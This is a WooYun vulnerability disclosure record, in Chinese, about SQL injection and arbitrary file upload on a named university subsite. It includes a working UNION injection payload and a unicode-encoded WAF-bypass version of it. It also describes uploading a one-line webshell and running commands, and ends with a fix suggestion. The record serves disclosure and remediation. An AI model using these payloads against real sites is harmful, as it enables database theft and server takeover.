{"id": 50489, "wybug_id": "wooyun-2014-077690", "wybug_title": "西华大学某分站存在SQL注入与任意文件上传已getshell", "wybug_corp": "CCERT教育网应急响应组", "wybug_author": "hanc00l", "wybug_date": "2014-09-29 10:42", "wybug_open_date": "2014-10-04 10:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 西华大学某分站存在SQL注入与任意文件上传，可以getshell 详细说明：  \n\nhttp://seie.xhu.edu.cn 在西华大学电气信息学院主页逛逛，在首页显示新闻地方的“更多”部份点进去，有一个搜索框，随便输入试了试，会出现服务器内部出错，如果有特殊符号会直接被复位。如图，使用2%' and '1'='2' union select 1,username,userpass,4,5,6,7,8 from admin where '%'='查询管理员表：\n\n\n\n估计是有硬件WAF之类的，经过尝试，使用unicode编码轻松绕过绕过。ACCESS数据库，经过猜表和字段，直接爆管理员和密码HASH，如图，使用unicode编码：%u0032%u0025%u0027%u0020%u0061%u006e%u0064%u0020%u0027%u0031%u0027%u003d%u0027%u0032%u0027%u0020%u0075%u006e%u0069%u006f%u006e%u0020%u0073%u0065%u006c%u0065%u0063%u0074%u0020%u0031%u002c%u0075%u0073%u0065%u0072%u006e%u0061%u006d%u0065%u002c%u0075%u0073%u0065%u0072%u0070%u0061%u0073%u0073%u002c%u0034%u002c%u0035%u002c%u0036%u002c%u0037%u002c%u0038%u0020%u0066%u0072%u006f%u006d%u0020%u0061%u0064%u006d%u0069%u006e%u0020%u0077%u0068%u0065%u0072%u0065%u0020%u0027%u0025%u0027%u003d%u0027\n\n解密发现是简单口令。后台地址简单化，很好猜，直接用管理员口令和密码进后台。\n\n后台有编辑和文件上传。虽然有限制，但使用burp毫无压力。上传一句话，菜刀出马，连接进行后台文件管理；在源文件中找到了数据库连接，同时可以执行命令。\n\n   漏洞证明：  \n\n\n\n查看了whoami，iis用的是network service账号，未进一步提权。写漏洞报告，提交，收工。   修复方案：  有WAF不够，建议对输入进行特殊符号和关键字过滤，代码里增加对XSS和SQL注入的检测和过滤。   版权声明：转载请注明来源 hanc00l@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-04 10:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}